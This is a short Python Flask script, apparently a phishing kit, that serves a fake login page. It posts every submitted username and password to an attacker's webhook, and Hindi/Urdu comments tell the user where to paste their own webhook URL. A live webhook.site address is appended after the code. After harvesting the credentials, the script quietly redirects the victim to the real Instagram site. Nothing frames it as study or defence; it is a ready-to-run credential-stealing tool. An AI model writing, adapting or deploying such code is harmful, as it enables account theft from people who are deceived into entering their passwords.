import requests
from flask import Flask, render_template, request, redirect

app = Flask(__name__, template_folder='templates')

@app.route('/')
def index():
    return render_template('login.html')

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username')
    password = request.form.get('password')
    
    # --- YAHAN APNA WEBHOOK URL PASTE KAREIN ---
    webhook_url = "APNA_COPIED_URL_YAHAN_DAALEIN"
    
    data = {
        "User": username,
        "Pass": password
    }
    
    # Ye data seedhe Webhook site par bhej dega
    try:
        requests.post(webhook_url, json=data)
    except:
        pass

    return redirect("https://www.instagram.com")

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=5000)https://webhook.site/2dde8ff5-df66-45a9-aad0-77a150dad13b
